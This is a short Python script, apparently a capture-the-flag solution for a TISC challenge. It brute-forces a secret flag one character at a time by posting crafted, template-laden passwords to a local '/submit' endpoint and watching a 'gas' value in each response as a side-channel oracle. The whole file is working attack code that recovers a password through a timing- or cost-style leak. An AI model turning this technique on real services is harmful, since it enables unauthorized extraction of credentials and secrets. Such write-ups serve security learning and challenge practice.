import requests
import string
import re

def extract_gas_number(input_string):
    pattern = r"&#39;gas&#39;: (\d+)"
    # Search for the pattern in the input string
    match = re.search(pattern, input_string)
    if match:
        # Return the first capturing group (the gas number)
        return int(match.group(1))
    else:
        # Return None if no match is found
        return None
    

success_story = 0
normal_num = 33341
current_guessed = ""
while True:
    for char in string.printable:
        middle_of_password = current_guessed + char + ("0" * (10 - success_story))
        password = "{" + middle_of_password + "}{{response_data}}"
        response = requests.post("http://localhost:80/submit", data={"password": password})
        num = extract_gas_number(response.text)

        if num > normal_num:
            normal_num = num
            current_guessed += char
            success_story += 1
            break
        
    if len(current_guessed) == 11:
        break

print("TISC{" + current_guessed + "}")